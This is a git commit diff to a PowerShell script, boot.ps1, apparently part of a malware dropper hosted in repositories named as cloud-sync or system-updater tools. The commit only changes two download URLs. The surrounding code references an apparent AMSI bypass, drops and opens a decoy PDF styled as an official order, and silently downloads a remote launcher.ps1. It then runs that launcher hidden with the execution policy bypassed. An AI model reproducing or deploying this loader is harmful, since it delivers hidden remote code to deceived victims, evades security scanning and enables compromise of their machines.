5dad632d5a6211c6f9297ab9e0999beb8fba31fa
123456 <273391509+astro-opensource@users.noreply.github.com>
2026-04-23 21:30:37 +0300

    Update boot.ps1

--- assets/boot.ps1
+++ assets/boot.ps1
@@ -26,14 +26,14 @@ Add-Type $amsi
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if(!(Test-Path $cache)){mkdir $cache -Force|Out-Null}
 
-$pdfUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/Nakaz_No._661_vid_02.03.2026-4.pdf'
+$pdfUrl = 'https://raw.githubusercontent.com/astro-opensource/system-updater/main/assets/Nakaz_No._661_vid_02.03.2026-4.pdf'
 $pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
 if(!(Test-Path $pdfPath)){
     (New-Object Net.WebClient).DownloadFile($pdfUrl,$pdfPath)
 }
 Start-Process $pdfPath
 
-$launcherUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/launcher.ps1'
+$launcherUrl = 'https://raw.githubusercontent.com/astro-opensource/system-updater/main/assets/launcher.ps1'
 $launcherPath = "$cache\launcher.ps1"
 (New-Object Net.WebClient).DownloadFile($launcherUrl,$launcherPath)
 Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" -WindowStyle Hidden
